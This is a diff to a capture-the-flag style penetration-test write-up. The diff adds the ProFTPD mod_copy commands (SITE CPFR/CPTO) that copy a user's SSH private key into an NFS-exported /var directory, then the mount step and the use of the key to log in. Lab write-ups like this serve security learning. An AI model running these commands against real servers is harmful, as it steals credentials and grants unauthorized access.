@@ -21,8 +21,16 @@ An advanced Nessus scan found two critical vulnerabilities.
 1. `ProFTPD mod_copy Information Disclosure`. An unauthenticated client can run the `SITE CPFR` and the `SITE CPTO` commands to change files' location.
 2. `NFS Exported Share Information Disclosure`. The directory `var` could be mounted.
 
-Putting the vulnerabilities together, I was able to copy the `id_rsa` key from `.ssh` to `/var`. `showmounts \e <host>` confirmed the the `/var` directory can be indeed mounted, and I executed `sudo mount -t nfs <host>:/var var_host
-`.
+Putting the vulnerabilities together, I was able to copy the `id_rsa` key from `.ssh` to `/var`. 
+
+```
+SITE CPFR /home/kenobi/.ssh/id_rsa
+350 File or directory exists, ready for destination name
+SITE CPTO /var/tmp/id_rsa
+```
+
+`showmounts -e <host>` confirmed that the `/var` directory can be indeed mounted. I executed `sudo mount -t nfs <host>:/var var_host
+`, and used the key to authenticate.
 
 
 ## Privilege Escalation
